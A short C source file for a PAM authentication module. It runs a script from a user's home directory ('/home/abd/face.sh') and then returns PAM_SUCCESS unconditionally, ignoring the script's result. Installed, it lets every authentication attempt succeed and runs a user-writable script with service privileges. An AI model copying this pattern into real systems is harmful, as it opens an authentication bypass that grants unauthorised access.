#include <security/pam_modules.h>
#include <stdio.h>
#include <stdlib.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    system("/home/abd/face.sh");
    return PAM_SUCCESS;
}
